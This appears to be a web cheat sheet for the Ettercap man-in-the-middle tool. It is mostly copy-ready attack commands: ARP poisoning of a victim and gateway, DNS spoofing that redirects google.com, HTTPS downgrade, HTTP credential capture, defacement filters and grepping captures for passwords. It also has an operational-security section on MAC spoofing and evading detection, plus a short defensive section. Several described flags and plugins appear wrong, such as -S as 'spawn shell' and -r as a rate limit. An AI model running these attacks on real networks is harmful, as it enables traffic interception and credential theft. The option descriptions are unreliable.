# Ettercap advanced

## Installation

### Linux (Debian/Ubuntu)

```bash
sudo apt-get update
sudo apt-get install ettercap-graphical ettercap-common
# Or CLI-only version
sudo apt-get install ettercap-text-only
```

### Linux (Fedora/RHEL)

```bash
sudo dnf install ettercap
```

### macOS

```bash
brew install ettercap
```

### Compilation from Source

```bash
git clone https://github.com/Ettercap/ettercap.git
cd ettercap
cmake .
make
sudo make install
```

## Mode Selection

### GUI Mode (Graphical)

```bash
sudo ettercap -G
# Recommended for interactive MITM attacks and real-time monitoring
# Provides visual interface for target selection and packet inspection
```

### Text/Curses Mode (Interactive Terminal)

```bash
sudo ettercap -T
# Full-featured interactive mode without graphical dependencies
# Better for remote/headless systems
```

### Quiet Mode (Non-interactive)

```bash
sudo ettercap -q
# Minimal output, useful for scripted deployments
```

### Info Mode (Display Information Only)

```bash
ettercap -i eth0 -P list
# List available plugins without launching attacks
```

## Network Interface Management

### List Available Interfaces

```bash
sudo ettercap -i list
# Display all network interfaces with details
```

### Select Specific Interface

```bash
sudo ettercap -i eth0
# Target specific interface (eth0, wlan0, etc.)
```

### Promiscuous Mode

```bash
sudo ettercap -i eth0 -p
# Enable promiscuous mode for network sniffing
```

## Target Selection

### Scan Subnet for Live Hosts

```bash
sudo ettercap -i eth0 -T -n
# N = scan for hosts, then exit
# Use before selecting targets
```

### Single Target Specification

```bash
# Command line: -t <IP>/CIDR
sudo ettercap -i eth0 -T -t 192.168.1.5
# Target single IP address
```

### Multiple Targets

```bash
# Syntax: IP1,IP2,IP3 or IP/mask
sudo ettercap -i eth0 -T -t 192.168.1.0/24
# Target entire subnet
```

### Exclude Targets

```bash
sudo ettercap -i eth0 -T -t 192.168.1.5 -e "192.168.1.1,192.168.1.10"
# Attack range but exclude specific IPs
```

## ARP Poisoning Attacks

### Unified Sniffing (Standard MitM)

```bash
sudo ettercap -i eth0 -T -M arp:unified /192.168.1.100/ /192.168.1.1/
# Attacker -> Target -> Gateway
# Intercept traffic from single host through gateway
# Syntax: /victim_IP/ /gateway_IP/
```

### Bridged Sniffing (Two-way Interception)

```bash
sudo ettercap -i eth0 -T -M arp:bridged /192.168.1.100/ /192.168.1.200/
# Intercept traffic between two hosts
# Useful for peer-to-peer communication interception
```

### Remote Bridged Sniffing

```bash
sudo ettercap -i eth0 -T -M arp:remote /192.168.1.5/ /10.0.0.5/
# Intercept traffic between hosts on different subnets
```

### ARP Spoofing with Request Reinjection

```bash
# GUI: Mitm -> ARP poisoning -> Sniff remote connections
# Automatically rejects ARP requests to maintain connection
```

## DNS Spoofing

### Create DNS Spoof Configuration

```bash
# Edit etter.dns file (typically /etc/ettercap/etter.dns)
# Format: pattern A|PTR|AAAA spoofed_IP
```

### DNS Configuration Example (etter.dns)

```plaintext
# Redirect all google.com requests to attacker
google.com A 192.168.1.10
www.google.com A 192.168.1.10
*.google.com A 192.168.1.10

# IPv6 spoofing
example.com AAAA ::ffff:c0a8:010a

# Reverse DNS (PTR)
1.1.1.1 PTR attacker.local
```

### Enable DNS Spoofing

```bash
sudo ettercap -i eth0 -T -M arp:unified -P dns_spoof /192.168.1.5/ /192.168.1.1/
# Requires -P dns_spoof plugin and configured etter.dns
```

### Custom DNS File Location

```bash
sudo ettercap -i eth0 -T -P dns_spoof -c /path/to/custom.dns
# Specify non-default DNS spoof configuration
```

## SSL Stripping & HTTPS Interception

### Enable SSLstrip Plugin

```bash
sudo ettercap -i eth0 -T -P sslstrip /192.168.1.5/ /192.168.1.1/
# Downgrades HTTPS to HTTP during interception
# Requires ARP poisoning to work
```

### Combined ARP + SSL Strip

```bash
sudo ettercap -i eth0 -T -M arp:unified -P sslstrip /192.168.1.5/ /192.168.1.1/
# Full MITM with SSL downgrade
```

### Content Filtering with SSL

```bash
# Intercept content after SSL stripping
# Modify HTTP responses during downgrade
```

## Packet Sniffing & Filtering

### Capture All Traffic

```bash
sudo ettercap -i eth0 -T -L all.pcap
# Log all captured traffic to pcap file
# -L flag enables logging mode
```

### Capture Specific Traffic

```bash
sudo ettercap -i eth0 -T -F "tcp.dst.port == 443"
# Apply filter: only capture HTTPS traffic
```

### Filter Syntax Examples

```bash
# Port-based filtering
tcp.dst.port == 80          # Destination port 80
tcp.src.port == 443         # Source port 443

# Protocol filtering
proto == TCP                # TCP only
proto == UDP                # UDP only
proto == ICMP               # ICMP only

# IP filtering
ip.src == 192.168.1.5       # Source IP
ip.dst == 8.8.8.8           # Destination IP
ip.dst in 192.168.1.0/24    # CIDR range

# HTTP-specific
http.request == 1           # HTTP requests only
http.uri contains "login"   # URI pattern matching
```

### Log Filtered Traffic

```bash
sudo ettercap -i eth0 -T -L captured.pcap -F "tcp.dst.port == 80"
# Capture and filter simultaneously
```

## Ettercap Filter System

### Create Custom Filter (.ef files)

```bash
# File: myfilter.ef
# Format: simple scripting language for packet manipulation
```

### Filter Example: Inject Content

```plaintext
if (ip.proto == TCP && tcp.dst.port == 80) {
    if (search(DATA.data, "User-Agent")) {
        replace("User-Agent: Mozilla", "User-Agent: Ettercap");
        msg("Modified User-Agent header");
    }
}
```

### Filter Example: Block Traffic

```plaintext
if (ip.proto == TCP && tcp.dst.port == 443) {
    kill();
}
```

### Compile Filter

```bash
etterfilter -o myfilter.filter myfilter.ef
# Converts .ef (human-readable) to .filter (bytecode)
```

### Apply Compiled Filter

```bash
sudo ettercap -i eth0 -T -F myfilter.filter
# Uses compiled filter during packet processing
```

### Filter Syntax Reference

```bash
# Data inspection
search(DATA.data, "string")     # Search in packet data
regex(DATA.data, "pattern")     # Regex matching

# Packet modification
replace("old", "new")           # Replace string
inject("content")               # Inject new content

# Flow control
kill()                          # Drop packet
drop()                          # Drop packet
accept()                        # Allow packet
```

## Plugin System

### List Available Plugins

```bash
sudo ettercap -P list
# Display all installed plugins with descriptions
```

### Load Specific Plugin

```bash
sudo ettercap -i eth0 -T -P plugin_name
# Load and execute named plugin
```

### Multiple Plugins

```bash
sudo ettercap -i eth0 -T -P plugin1 -P plugin2 -P plugin3
# Load multiple plugins simultaneously
```

### Common Plugins

| Plugin | Purpose |
| --- | --- |
| `dns_spoof` | DNS spoofing attacks |
| `sslstrip` | HTTPS downgrade |
| `autoadd` | Auto-add targets from traffic |
| `arp_cop` | Detect ARP spoofing |
| `chk_poison` | Verify ARP poisoning success |
| `find_ettercap` | Detect other Ettercap instances |
| `ettercap_etter` | Compatibility plugin |
| `finger` | Passive OS fingerprinting |

### Plugin Information

```bash
sudo ettercap -P plugin_name -h
# Display plugin-specific help and options
```

## Common Attack Scenarios

### HTTP Credential Capture

```bash
sudo ettercap -i eth0 -T -M arp:unified \
  -F "tcp.dst.port == 80" \
  -L credentials.pcap \
  /192.168.1.100/ /192.168.1.1/
# Capture HTTP traffic from target
# Analyze pcap for unencrypted credentials
```

### Website Defacement (HTTP)

```bash
# Create filter to replace content
etterfilter -o deface.filter deface.ef

sudo ettercap -i eth0 -T -M arp:unified \
  -F deface.filter \
  /192.168.1.100/ /192.168.1.1/
```

### DNS Spoofing Attack

```bash
sudo ettercap -i eth0 -T \
  -M arp:unified \
  -P dns_spoof \
  /192.168.1.100/ /192.168.1.1/
# Redirect target's DNS requests to attacker IP
```

### Transparent Proxy Setup

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Redirect traffic to local proxy
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 \
  -j REDIRECT --to-port 8080

# Run Ettercap with ARP poisoning
sudo ettercap -i eth0 -T -M arp:unified /192.168.1.100/ /192.168.1.1/
```

### HTTPS Interception

```bash
sudo ettercap -i eth0 -T \
  -M arp:unified \
  -P sslstrip \
  /192.168.1.100/ /192.168.1.1/
# Requires ARP poisoning to intercept traffic
```

## OPSEC Considerations

### Use MAC Spoofing

```bash
sudo macchanger -r eth0
# Randomize MAC address before attacking
# Harder to trace to physical hardware
```

### Disable ARP Announcements

```bash
# Avoid broadcasting identity during ARP poisoning
# Edit etter.conf: set send_arp in appropriate mode
```

### Clean Up After Attacks

```bash
# Stop Ettercap (Ctrl+C)
# Send gratuitous ARP to restore normal traffic
# Re-poison gateway with correct MAC if needed

# Manually send correction ARP
# Ensures victims resume normal connectivity
```

### Use VPN/Proxy

```bash
# Route Ettercap traffic through VPN
# Masks attacker IP from upstream logging
```

### Avoid Detection

```bash
# Disable verbose logging in GUI
# Use quiet mode (-q) for minimal indicators
# Avoid generating ICMP/DNS queries from attacker IP
# Time attacks during high network activity
```

## Defense & Detection

### Detect ARP Spoofing

```bash
# Monitor for multiple MACs advertising same IP
# Excessive ARP traffic on quiet network
# Inconsistent MAC->IP mappings

# Tools: arp-scan, ettercap -P arp_cop
```

### Prevent ARP Poisoning

```bash
# Use static ARP entries for critical servers
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Enable ARP filtering on Linux
echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
echo 1 > /proc/sys/net/ipv4/conf/all/arp_announce

# Use ARP monitoring tools: XArp, Arpwatch
```

### Detect HTTPS Downgrade (SSL Strip)

```bash
# Monitor for unexpected HTTP on ports normally HTTPS
# Check for missing HSTS headers
# Browser warnings about invalid certificates
```

### Network Segmentation

```bash
# Isolate critical systems on separate VLANs
# Restrict ARP traffic between subnets
# Implement 802.1X port security
```

### Encryption Everywhere

```bash
# Use VPN for all sensitive traffic
# Enforce HTTPS with HSTS headers
# Use certificate pinning in applications
```

## Advanced Options

### Packet Rate Limiting

```bash
sudo ettercap -i eth0 -T -r 100
# Limit packet rate to 100 packets/second
# Reduces network load and detection risk
```

### Spawn Shell

```bash
sudo ettercap -i eth0 -T -S
# Drop to interactive shell during sniffing
```

### Dumping Utilities

```bash
# View captured pcap files
tcpdump -r captured.pcap
wireshark captured.pcap

# Parse specific protocol
strings captured.pcap | grep "password"
```

### Configuration File

```bash
# Edit /etc/ettercap/etter.conf
# Configure global behavior:
# - ARP poisoning mode
# - Packet timing
# - Plugin paths
# - Logging options

sudo ettercap -i eth0 -T -w /custom/path/etter.conf
```

### IPv6 Support

```bash
sudo ettercap -i eth0 -T -6
# Enable IPv6 MITM attacks (experimental)
```

## Troubleshooting

### Poisoning Not Working

```bash
# Verify IP forwarding enabled
cat /proc/sys/net/ipv4/ip_forward

# Enable if needed
sudo sysctl -w net.ipv4.ip_forward=1

# Check gateway reachability
ping 192.168.1.1

# Verify interface selection
sudo ettercap -i list
```

### Filter Compilation Errors

```bash
# Validate filter syntax
etterfilter -o output.filter input.ef -d

# Check for syntax errors in .ef file
# Review etterfilter man page for grammar
```

### DNS Spoofing Not Resolving

```bash
# Verify etter.dns format (spaces, not tabs)
# Ensure pattern matches target's DNS queries
# Check DNS plugin loaded: sudo ettercap -P list

# Test with nslookup from victim machine
nslookup example.com
```

### Performance Issues

```bash
# Reduce filter complexity
# Enable quiet mode (-q)
# Limit packet capture scope with -F flags
# Use bridged mode instead of unified for better performance
```

Source: https://1337skills.com/cheatsheets/ettercap/
